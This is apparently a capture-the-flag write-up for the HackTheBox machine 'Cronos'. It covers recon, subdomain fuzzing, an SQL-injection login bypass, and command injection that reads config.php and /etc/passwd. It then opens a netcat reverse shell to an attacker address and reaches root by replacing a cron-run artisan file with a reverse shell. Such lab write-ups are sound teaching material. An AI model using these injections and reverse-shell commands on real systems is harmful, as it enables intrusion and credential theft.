# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.13 -T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/1.png">

# Enumeration
Running gobuster didn't result in anything.
```
gobuster dir -u http://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt
```

We then search for subdomains with wfuzz:
```
wfuzz -u http://cronos.htb -w /usr/share/wordlists/wfuzz/general/big.txt  -H 'Host: FUZZ.cronos.htb' --hw 975
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/2.png">


After adding admin to the /etc/hosts we try if we can use SQL injection to bypass the login form.
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/3.png">



This command will list the config.php file. We got a username and password for a database.
```
8.8.8.8;cat config.php
```

<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/4.png">

We can also view the content of /etc/passwd and spot three accounts that have bash available.
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/5.png">

# Initial Foothold
We know we can use local file inclusion and command injection. Let's try if we can create a reverse shell by adding the following as command:

```
8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4444 >/tmp/f
```

# Privilege Escalation
We got a reverse shell as ```www-data``` and see that there's a cronjob running. After checking permissions we see that it is owned by ```www-data``` so we are able to change the file to our liking. We could alter it to get the content of /root/root.txt.

<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/6.png">

Another approach is to replace artisan with a reverse php shell. As this script will run as root we will get a shell as root.

Let's grab the shell from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

We setup a webserver and download the file with ```wget```. We then move the file to replace artisan:
```
mv shell.py /var/www/laravel/artisan
```
We wait while we have our netcat listener ready and get a root shell on the host.
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Cronos/assets/7.png">









